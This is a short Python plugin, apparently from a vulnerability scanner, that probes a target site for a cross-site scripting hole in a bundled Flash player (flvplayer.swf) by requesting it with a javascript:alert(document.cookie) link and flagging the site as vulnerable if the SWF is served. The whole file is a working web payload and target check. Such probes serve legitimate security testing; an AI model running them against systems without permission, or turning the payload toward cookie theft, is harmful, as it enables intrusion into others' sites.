#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/static/image/common/flvplayer.swf?file=1.flv&linkfromdisplay=true&link=javascript:alert(document.cookie);"
bug ="CWSL"
info ="/static/image/common/flvplayer.swf?file=1.flv&linkfromdisplay=true&link=javascript:alert(document.cookie);" 

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
